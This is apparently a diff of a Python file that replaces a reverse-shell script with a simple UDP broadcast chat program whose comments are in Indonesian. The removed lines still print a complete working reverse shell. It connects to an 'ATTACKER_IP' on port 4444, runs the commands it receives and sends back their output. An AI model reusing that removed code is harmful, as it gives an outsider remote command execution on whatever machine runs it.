@@ -1,34 +1,28 @@
 import socket
-import subprocess
-import os
+import threading
 
-# Replace with your attacker's IP and port
-ATTACKER_IP = "192.168.1.10"
-ATTACKER_PORT = 4444
+# Ubah alamat broadcast sesuai dengan subnet jaringan Anda
+BROADCAST_IP = "192.168.1.255"  # Sesuaikan dengan alamat broadcast jaringan
+PORT = 12345
+USERNAME = input("Masukkan nama pengguna: ")
 
-def connect():
-    try:
-        # Create a socket connection
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((ATTACKER_IP, ATTACKER_PORT))
-        
-        # Redirect output to the attacker's machine
-        while True:
-            # Receive command from attacker
-            command = sock.recv(1024).decode("utf-8")
-            
-            if command.lower() == "exit":
-                break
-            
-            # Execute the command
-            output = subprocess.getoutput(command)
-            
-            # Send back the output
-            sock.send(output.encode("utf-8"))
-        
-        sock.close()
-    except Exception as e:
-        print(f"Connection error: {e}")
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+sock.bind(("", PORT))
 
-if __name__ == "__main__":
-    connect()
+def receive_messages():
+    while True:
+        try:
+            message, address = sock.recvfrom(1024)
+            print(message.decode("utf-8"))
+        except:
+            break
+
+def send_messages():
+    while True:
+        message = input("")
+        full_message = f"{USERNAME}: {message}"
+        sock.sendto(full_message.encode("utf-8"), (BROADCAST_IP, PORT))
+
+threading.Thread(target=receive_messages, daemon=True).start()
+send_messages()
